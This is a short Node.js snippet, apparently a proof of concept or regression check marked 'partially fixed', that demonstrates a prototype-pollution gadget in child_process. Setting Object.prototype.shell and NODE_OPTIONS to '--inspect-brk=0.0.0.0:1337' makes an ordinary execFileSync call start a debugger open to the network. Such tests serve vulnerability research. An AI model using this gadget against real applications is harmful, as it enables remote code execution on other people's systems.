// PARTIALLY FIXED

const { execFileSync } = require('child_process');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

const output = execFileSync('hostname', { env: {AAA: "BBB"} });
console.log(output.toString());
